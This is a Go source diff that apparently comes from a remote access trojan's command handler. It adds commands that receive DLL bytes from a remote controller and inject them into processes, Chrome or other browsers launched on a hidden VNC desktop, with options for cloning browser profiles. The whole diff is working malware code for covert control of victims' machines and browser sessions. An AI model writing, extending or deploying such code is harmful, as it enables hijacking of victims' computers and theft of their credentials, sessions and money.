@@ -444,6 +444,21 @@ func writeVoiceDownlink(data []byte) error {
 	return nil
 }
 
+func extractDLLBytes(payload map[string]interface{}) []byte {
+	if payload == nil {
+		return nil
+	}
+	switch v := payload["dll"].(type) {
+	case []byte:
+		return v
+	case string:
+		if len(v) > 0 {
+			return []byte(v)
+		}
+	}
+	return nil
+}
+
 func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]interface{}) error {
 	cmdID, _ := envelope["id"].(string)
 	action, _ := envelope["commandType"].(string)
@@ -1263,6 +1278,92 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		goSafe("hvnc_start_process", nil, func() {
 			if err := capture.StartHVNCProcess(filePath); err != nil {
 				log.Printf("hvnc: start process failed for %q: %v", filePath, err)
+			}
+		})
+		return nil
+
+	case "hvnc_start_process_injected":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		filePath := ""
+		searchPath := ""
+		replacePath := ""
+		if payload != nil {
+			if v, ok := payload["path"].(string); ok {
+				filePath = v
+			}
+			if v, ok := payload["search_path"].(string); ok {
+				searchPath = v
+			}
+			if v, ok := payload["replace_path"].(string); ok {
+				replacePath = v
+			}
+		}
+		dllBytes := extractDLLBytes(payload)
+		if len(dllBytes) == 0 {
+			sendCommandResultSafe(env, cmdID, false, "no DLL provided")
+			return nil
+		}
+		log.Printf("hvnc: start process injected %q search=%q replace=%q dllSize=%d", filePath, searchPath, replacePath, len(dllBytes))
+		sendCommandResultSafe(env, cmdID, true, "")
+		goSafe("hvnc_start_process_injected", nil, func() {
+			if err := capture.StartHVNCProcessInjected(filePath, dllBytes, searchPath, replacePath); err != nil {
+				log.Printf("hvnc: injected process failed for %q: %v", filePath, err)
+			}
+		})
+		return nil
+
+	case "hvnc_start_chrome_injected":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		chromePath := ""
+		if payload != nil {
+			if v, ok := payload["path"].(string); ok {
+				chromePath = v
+			}
+		}
+		dllBytes := extractDLLBytes(payload)
+		if len(dllBytes) == 0 {
+			sendCommandResultSafe(env, cmdID, false, "no DLL provided")
+			return nil
+		}
+		log.Printf("hvnc: start chrome injected path=%q dllSize=%d", chromePath, len(dllBytes))
+		sendCommandResultSafe(env, cmdID, true, "")
+		goSafe("hvnc_start_chrome_injected", nil, func() {
+			if err := capture.StartHVNCChromeInjected(chromePath, dllBytes); err != nil {
+				log.Printf("hvnc: chrome injected failed: %v", err)
+			}
+		})
+		return nil
+
+	case "hvnc_start_browser_injected":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		browser := ""
+		exePath := ""
+		clone := true
+		if payload != nil {
+			if v, ok := payload["browser"].(string); ok {
+				browser = v
+			}
+			if v, ok := payload["path"].(string); ok {
+				exePath = v
+			}
+			if v, ok := payload["clone"].(bool); ok {
+				clone = v
+			}
+		}
+		dllBytes := extractDLLBytes(payload)
+		if len(dllBytes) == 0 {
+			sendCommandResultSafe(env, cmdID, false, "no DLL provided")
+			return nil
+		}
+		if browser == "" {
+			sendCommandResultSafe(env, cmdID, false, "no browser specified")
+			return nil
+		}
+		log.Printf("hvnc: start browser injected browser=%q path=%q clone=%v dllSize=%d", browser, exePath, clone, len(dllBytes))
+		sendCommandResultSafe(env, cmdID, true, "")
+		goSafe("hvnc_start_browser_injected", nil, func() {
+			if err := capture.StartHVNCBrowserInjected(browser, exePath, dllBytes, clone); err != nil {
+				log.Printf("hvnc: browser injected failed for %q: %v", browser, err)
 			}
 		})
 		return nil
